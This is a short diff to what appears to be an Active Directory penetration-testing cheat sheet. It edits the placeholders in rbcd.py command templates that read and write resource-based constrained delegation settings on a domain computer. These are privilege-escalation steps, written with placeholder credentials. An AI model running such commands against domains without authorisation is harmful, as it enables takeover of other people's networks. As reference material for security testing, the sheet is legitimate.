@@ -16,7 +16,7 @@
 
 #### 3) rbcd.py
 
- - rbcd.py -delegate-to 'COMPUTER$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)
+ - rbcd.py -delegate-to 'TARGET$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)
 
  - rbcd.py -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD
 
